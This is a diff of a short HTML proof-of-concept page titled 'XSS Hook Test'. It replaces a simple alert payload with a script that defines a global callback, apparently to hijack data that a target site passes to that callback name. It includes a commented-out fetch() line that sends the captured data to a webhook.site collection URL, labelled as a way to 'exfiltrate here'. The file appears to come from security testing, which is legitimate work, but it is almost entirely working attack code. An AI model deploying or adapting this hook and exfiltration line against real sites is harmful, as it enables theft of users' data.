@@ -1,1 +1,16 @@
-<script>alert('XSS by Neha')</script>
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>XSS Hook</title>
+  </head>
+  <body>
+    <h1>XSS Hook Test</h1>
+    <script>
+      window.__ctcg_ct_77546_exec = function(data) {
+        alert("🔥 Hooked! Payload executed.\nData: " + JSON.stringify(data).slice(0, 200) + "...");
+        // You can also exfiltrate here:
+        // fetch("https://webhook.site/YOUR-ID?data=" + encodeURIComponent(JSON.stringify(data)));
+      };
+    </script>
+  </body>
+</html>
